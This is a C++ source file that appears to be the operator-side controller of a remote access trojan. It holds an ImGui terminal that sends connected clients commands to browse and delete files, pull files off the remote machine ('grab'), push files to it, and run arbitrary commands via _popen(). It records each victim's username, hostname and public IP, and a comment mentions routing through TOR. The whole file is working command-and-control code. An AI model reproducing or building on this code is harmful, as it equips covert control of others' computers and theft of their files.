#include "includeCrap.hpp"

/*
    Class for a connection to the server.
    Decided to put the terminal functions inside this class, hopefully that wasnt a bad idea and it wont    Mostly holds data about the connection.
    Also has useful functions :) become a mess
*/
class connection{
private:
    std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
    bool lastConnectivityCheck = false; // Last result of the connectivity check
    std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
    char inputBuffer[1024] = {0}; // Used for the text input box
    const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
    std::string msgToSend = ""; // This will be derived from the input buffer

    /*
        Draws the terminal window
        Consists of a scrolling text box and an input box which sends the message when enter is pressed
        The input box is set to always have keyboard focus
    */
    void drawTerminalWindow(){
        unsigned int windowWidth = 50;
        unsigned int windowHeight = 25;
        
        // Configure and create window:
        ImGui::SetNextWindowPos(ImVec2((ImGui::GetIO().DisplaySize.x/2)-(windowWidth/2), (ImGui::GetIO().DisplaySize.y/2)-(windowHeight/2)), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(windowWidth, windowHeight), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());

        // Draw the scrolling text box, adding each item from this->plainTextMessageHistory:
        ImGui::BeginChild("Scrolling", ImVec2(0, -2), false);
        for(auto m : this->plainTextMessageHistory){
            ImGui::TextWrapped("%s", m.c_str());
        }
        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){ // If the window is scrolled to the bottom, scroll down automatically when new text is added
            ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();

        // Draw the input box:
        ImGui::SetNextItemWidth(ImGui::GetContentRegionAvailWidth());
        if(ImGui::InputText("##Input", this->inputBuffer, this->inputBufferSize, ImGuiInputTextFlags_EnterReturnsTrue)){ // If enter is pressed, then set this->msgToSend to the contents of the input buffer
            this->msgToSend = std::string(this->inputBuffer); // this->msgToSend will be processed when this->update() is called
            memset(this->inputBuffer, 0, this->inputBufferSize); // Clear the input buffer
        }

        // Set the keyboard focus to the input box (as long as its not being used for something else):
        if(!ImGui::IsAnyItemActive() && !ImGui::IsMouseClicked(0)){
            ImGui::SetKeyboardFocusHere();
        }

        ImGui::End();
    }


    /*
        Parses the given command and calls the appropriate function
    */
    void parseSendCmd(std::string cmd){
        this->plainTextMessageHistory.push_back("--> " + cmd);
        if(cmd.starts_with("help")){
            this->help();
        }
        else if(cmd.starts_with("clear")){
            this->plainTextMessageHistory.clear();
        }
        else if(cmd.starts_with("pwd")){
            this->genericCmd("pwd;");
        }
        else if(cmd.starts_with("ls")){
            this->ls();
        }
        else if(cmd.starts_with("cd ")){
            this->genericCmd("cd;" + cmd.substr(3) + ";");
        }
        else if(cmd.starts_with("rm ")){
            this->genericCmd("rm;" + cmd.substr(3) + ";");
        }
        else if(cmd.starts_with("mkdir ")){
            this->genericCmd("mkdir;" + cmd.substr(6) + ";");
        }
        else if(cmd.starts_with("grab ")){
            this->grab(cmd.substr(5));
        }
        else if(cmd.starts_with("upload ")){
            this->upload(cmd.substr(7));
        }
        else if(cmd.starts_with("exec ")){
            this->exec(cmd.substr(5));
        }
        else{
            this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
        }
    }


    /*
        Display a list of available commands and what they do
    */
    void help(){
        this->plainTextMessageHistory.push_back("= Available commands:");
        this->plainTextMessageHistory.push_back("== help - Displays this help message");
        this->plainTextMessageHistory.push_back("== clear - Clears the message history");
        this->plainTextMessageHistory.push_back("== pwd - Displays the current working directory");
        this->plainTextMessageHistory.push_back("== ls - Lists the files in the current working directory");
        this->plainTextMessageHistory.push_back("== cd <path> - Changes the current working directory to <path>");
        this->plainTextMessageHistory.push_back("== rm <path> - Removes the file at <path>");
        this->plainTextMessageHistory.push_back("== mkdir <path> - Creates a directory at <path>");
        this->plainTextMessageHistory.push_back("== grab <path> - Downloads the file at the remote <path> to this machine (at ./)");
        this->plainTextMessageHistory.push_back("== upload <path> - Uploads the file at the local <path> to the remote machine");
        this->plainTextMessageHistory.push_back("== exec <command> - Executes the command on the remote machine via _popen()");
    }


    /*
        Used to call simple commands like cd, rm, mkdir, etc (these functions return a very simple response of fail/success)
        Response from client: <cmd>;<response>
    */
    void genericCmd(std::string cmd){
        this->sockFdMutex.lock();

        // Send the command to the client:
        int bytesSent = send(this->sockFd, cmd.c_str(), cmd.length(), 0);
        if(bytesSent < 0){ // A negative value indicates an error
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }

        // Receive the response from the client:
        char cmdRecvBuffer[4096] = {0}; // 4096 bytes should easily be enough for the responses to any commands sent using this function
        int bytesReceived = recv(this->sockFd, cmdRecvBuffer, 4096, 0);
        if(bytesReceived < 0){ // A negative value here also indicates an error. Not sure if I really need to be handling this error (will it actually occur?)
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response and append it to the message history:
        std::string cmdRecvBufferString = std::string(cmdRecvBuffer); // Convert to a string for easier parsing
        if(!cmdRecvBufferString.starts_with(cmd)){
            this->plainTextMessageHistory.push_back("WARN: Received an unexpected response from the client");
        }
        this->plainTextMessageHistory.push_back(cmdRecvBufferString.substr(cmd.length(), cmdRecvBufferString.length() - cmd.length() - 1)); // Extract just the <response> from "<cmd>;<response>;"
        this->sockFdMutex.unlock();
    }


    /*
        Lists the files and folders in the current working directory
        The client appends a "/" to the end of directories
        ls() cant be a genericCmd() because the response is a list which needs to be parsed
        The response from the client is a list of files and folders separated by newlines using the following format:
        "ls;<response size>;<file1>;<file2>;...;<fileN>"

        !!!!! NOTE !!!!!
        This function currently has a hardcoded buffer size of 4096 bytes. This is not ideal and will be fixed later.
    */
    void ls(){
        this->sockFdMutex.lock();

        // Send "ls;" to the client:
        int bytesSent = send(this->sockFd, "ls;", 3, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }

        // Receive the response from the client:
        char lsRecvBuffer[4096] = {0}; // !!! fixed size, any information past 4096 bytes will be lost
        int bytesReceived = recv(this->sockFd, lsRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response size from the response:
        std::string lsRecvBufferString = std::string(lsRecvBuffer); // Convert to a string for easier parsing
        if(lsRecvBufferString.substr(0, 3) != "ls;"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->sockFdMutex.unlock();
            return;
        }
        lsRecvBufferString = lsRecvBufferString.substr(3); // Remove the "ls;" from the start of the string
        unsigned long long int responseSize = std::stoull(lsRecvBufferString.substr(0, lsRecvBufferString.find(';'))); // Extract the response size from the response
        lsRecvBufferString = lsRecvBufferString.substr(lsRecvBufferString.find(';')); // Remove the response size from the start of the string

        // Receive the rest of the response (if it is larger than 4096 bytes):
        while(lsRecvBufferString.length() < responseSize){
            bytesReceived = recv(this->sockFd, lsRecvBuffer, 4096, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            lsRecvBufferString += std::string(lsRecvBuffer);
        }

        // Parse each file/folder from the response and append it to the message history:
        std::stringstream ss(lsRecvBufferString); // Create a stringstream so that getline() can be used to go through the string one token at a time based on the delimiter ";"
        std::string f;
        while(getline(ss, f, ';')){
            this->plainTextMessageHistory.push_back(f); // The delimiter is removed from the string by getline(), so we can just push_back() f without any modifications
        }

        this->sockFdMutex.unlock();
    }


    /*
        Grab a file from the client
        The response from the client will be in the format:
            grab;<file path>;<file size>;<file data>;
        The file data is in raw bytes, so it can be written to a file as-is
    */
    void grab(std::string path){
        this->sockFdMutex.lock();

        // Send the grab command to the client:
        int bytesSent = send(this->sockFd, ("grab;" + path + ";").c_str(), path.length() + 6, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }

        // Receive 4096 bytes from the client - this will include the file size and the first chunk of the file (or all of it if it's smaller than 4096 bytes):
        char grabRecvBuffer[4096] = {0};
        int bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response to get the file size:
        std::string grabRecvBufferString = std::string(grabRecvBuffer); // Cant use this string for any of the file data, because null terminated :(
        if(grabRecvBufferString.substr(0, 5+path.size()+1) != "grab;" + path + ";" || grabRecvBufferString[5+path.size()+1] == '0'){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format or file not found");
            this->plainTextMessageHistory.push_back(grabRecvBufferString);
            this->plainTextMessageHistory.push_back("grab;" + path + ";");
            this->sockFdMutex.unlock();
            return;
        }
        unsigned long long int fileSize = std::stoull(grabRecvBufferString.substr(5+path.size()+1)); // !!! unsafe as fuck :( 

        // Read the file data into an std::vector<char>, receive more data from the socket if the fileSize is greater than what has been received so far:
        std::vector<char> fileData;
        fileData.reserve(fileSize); // Hopefully speeds up the insert() calls as memory is already allocated
        unsigned int headerSize = 5+path.size()+1+std::to_string(fileSize).size()+1; // The size of "grab;[path];[file size];", so we can ignore it when 
        fileData.insert(fileData.end(), grabRecvBuffer+headerSize, grabRecvBuffer+bytesReceived); // Insert the data that was received in the first recv() call, minus the header
        unsigned long long int bytesReceivedTotal = bytesReceived - headerSize; // The total number of bytes of actual file data that has been received so far
        while(bytesReceivedTotal < fileSize){
            bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            fileData.insert(fileData.end(), grabRecvBuffer, grabRecvBuffer+bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }

        // Write the file data to disk:
        this->plainTextMessageHistory.push_back("Recieved " + std::to_string(bytesReceivedTotal) + " bytes of data");
        std::ofstream of("./" + path, std::ios::binary); // !!!! unsanitized path, user stupidity could lead to overwriting files
        of.write(fileData.data(), fileData.size());
        of.close();
        this->plainTextMessageHistory.push_back("File written to disk at ./" + path);

        this->sockFdMutex.unlock();
    }


    /*
        Upload a file to the client
        The request to the client will be in the format:
            upload;<file name>;<file size>;<file data>;
    */
    void upload(std::string path){
        // Open the local file:
        std::ifstream f(path, std::ios::binary);
        if(f.is_open() != true){ // Most likely, the file does not exist
            this->plainTextMessageHistory.push_back("ERR: File not found");
        }else{
            this->sockFdMutex.lock();

            // Create the upload request:
            // "upload;<file name>;<file size>;<file data>;"
            std::string header = "upload;" + std::filesystem::path(path).filename().string() + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
            std::vector<char> uploadData;
            uploadData.reserve(header.size() + std::filesystem::file_size(path));
            uploadData.insert(uploadData.end(), header.begin(), header.end());
            uploadData.insert(uploadData.end(), std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());
            f.close();

            // Send the upload request to the client:
            int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
            if(bytesSent < 0){
                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
                this->sockFdMutex.unlock();
                return;
            }
            this->plainTextMessageHistory.push_back("Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");

            // Receive the response from the client:
            char responseBuffer[1024] = {0};
            int bytesReceived = recv(this->sockFd, responseBuffer, 1024, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
            
            this->sockFdMutex.unlock();
        }
    }


    /*
        Executes a command on the client via _popen()
        Command output will be sent back to the server
        Command output can be of any length, to handle this the response from the client will be in the format:
            exec;<command>;<response length>;<response data>;
    */
    void exec(std::string cmd){
        this->sockFdMutex.lock();

        // Send the command to the client
        int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " (likely disconnected)");
            this->sockFdMutex.unlock();
            return;
        }

        // Receive the first 4096 bytes of the response, this is by far enough to get the response length:
        char responseBuffer[4096] = {0};
        int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response size from the response:
        std::string responseBufferString = std::string(responseBuffer);
        if(responseBufferString.substr(0, 6+cmd.size()) != "exec;" + cmd + ";"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->plainTextMessageHistory.push_back(responseBufferString);
            this->sockFdMutex.unlock();
            return;
        }
        unsigned long long int responseSize = std::stoull(responseBufferString.substr(6+cmd.size())); // Unsafe poopoo code!!!!!

        // Add the first 4096-<header size> bytes of the first chunk of the response to the response vector:
        std::vector<char> response;
        response.reserve(responseSize); // reserve will hopefully make the vector a bit faster by allocating the memory in advance
        unsigned int headerSize = 6+cmd.size()+1+std::to_string(responseSize).size(); // The size of "exec;[cmd];[response size];". Creating this variable because its quite long and its used a whole two times
        response.insert(response.end(), responseBufferString.begin()+headerSize, responseBufferString.end());

        // Receive more chunks of 4096 bytes until the total number of bytes received is equal to the response size:
        unsigned long long int bytesReceivedTotal = bytesReceived - headerSize;
        while(bytesReceivedTotal < responseSize){
            bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
                this->sockFdMutex.unlock();
                return;
            }
            response.insert(response.end(), responseBuffer, responseBuffer+bytesReceived); // Insert the received bytes into the end of the response vector
            bytesReceivedTotal += bytesReceived;
        }

        // Add the response to the plain text message history:
        this->plainTextMessageHistory.push_back("=== exec() response ===");
        // Split it up based on newlines to prevent crashing imgui (a single giant line will cause imgui/imtui to try and render too many triangles)
        // Example: calling "exec dir" inside system32 will return lots of stuff and it made it crash lol, but now it doesn't
        std::stringstream ss(std::string(response.begin(), response.end()-1));
        std::string line;
        while(std::getline(ss, line, '\n')){
            this->plainTextMessageHistory.push_back(line);
        }
        this->plainTextMessageHistory.push_back("=== exec() response ===");

        this->sockFdMutex.unlock();
    }


public:
    // Public variables that the server class uses to display info and keep track of the connection:
    int sockFd = -1; // Socket file descriptor - assumed to be valid when the object is created
    std::string username;
    std::string hostname;
    std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
    bool terminalActive = false; // Whether or not the terminal is being displayed and used

    // Constructor and destructor are pretty basic:
    connection(int sockFd){
       this->sockFd = sockFd;
    }

    ~connection(){
        this->sockFdMutex.lock();
        close(this->sockFd);
        this->sockFdMutex.unlock();
    }


    /*
        Handles the initial connection with the client
        Returns true if the connection was successful, false otherwise
        The client must send their username, hostname, and public IP in the format "ip;username;hostname;"
        If the client does not send this information in the correct format, the connection will be closed
        The server responds to the client with with "ip;username;hostname;connected;" if the connection was successful
    */
    bool intialConnection(){
        this->sockFdMutex.lock();

        // Receive the initial connection message from the client:
        char buffer[1024] = {0}; // Should easily be enough space
        int bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        if(bytesReceived < 0){
            return false;
        }

        // Parse the message:
        std::string bufferString = std::string(buffer); // Convert to a string for easier parsing
        if(std::count(bufferString.begin(), bufferString.end(), ';') != 3){
            return false;
        }
        this->publicIp = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->username = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->hostname = bufferString.substr(0, bufferString.find(';'));
        /*
            ... add some more verification here if you want to make extra sure the client is sending valid data ...
        */

        // Send the confirmation message to the client, since the connection was successful:
        std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
        int bytesSent = send(this->sockFd, confirmMsg.c_str(), confirmMsg.length(), 0);

        this->sockFdMutex.unlock();
        return true;
    }


    /*
        Draws terminal window if it is active
        Also processes any commands that need to be sent
    */
    void update(){
        // If the terminal is active, then draw its window:
        if(this->terminalActive){
            this->drawTerminalWindow();
        }

        // If this->msgToSend is not empty, then there is a command that needs to be processed:
        if(this->msgToSend != ""){
            this->parseSendCmd(this->msgToSend);
            this->msgToSend = ""; // Clear msgToSend now that the command has been processed

            // Read any remaining data from the socket (flush the socket):
            this->sockFdMutex.lock();
            char buffer[1024] = {0};
            int bytesReceived = 0;
            int flags = fcntl(this->sockFd, F_GETFL, 0); // Get the current flags for the socket so they can be restored later
            fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK); // Set the socket to non-blocking mode
            do{ // Read all the data from the socket
                bytesReceived = recv(this->sockFd, buffer, 1024, 0);
            }while(bytesReceived > 0);
            fcntl(this->sockFd, F_SETFL, flags); // Restore the original socket flags
            this->sockFdMutex.unlock();
        }
    }


    /*
        This function is called by a separate thread every <n> seconds to check if the connection is still alive
        The function which calls this function checks that this->terminalActive is false before calling this function (dont ping a terminal that is being used)
    */
    bool connectivityCheck(){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ping;", 5, 0);
        if(bytesSent != 5){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        char buffer[10] = {0};
        int bytesReceived = recv(this->sockFd, buffer, 10, 0);
        if(std::string(buffer) != "ping;pong;"){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        this->sockFdMutex.unlock();
        this->lastConnectivityCheck = true;
        return true;
    }


    /*
        Draws a window with some info about the connection
        Not particularly useful.
    */
    void drawDebugWindow(){ // Draws some basic debug info to the screen
        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " debug info").c_str());
        ImGui::Text("Username: %s", this->username.c_str());
        ImGui::Text("Hostname: %s", this->hostname.c_str());
        ImGui::Text("Public IP: %s", this->publicIp.c_str());
        ImGui::Text("Connectivity: %s", (this->lastConnectivityCheck)?"OK":"ERR");
        ImGui::End();
    }


    /*
        The purpose of closeTerminal() is to set this->terminalActive to false and flush the socket
        Flushing the socket is necessary because data may be left in the socket buffer, which will cause the ping-pong to fail and the connection to be closed
        Does not close the socket, that is done by the destructor. This function is just used to close the terminal window
    */
    void closeTerminal(){
        this->terminalActive = false;
        char buffer[1024] = {0};
        int bytesReceived = 0;
        int flags = fcntl(this->sockFd, F_GETFL, 0);
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
    }
    
};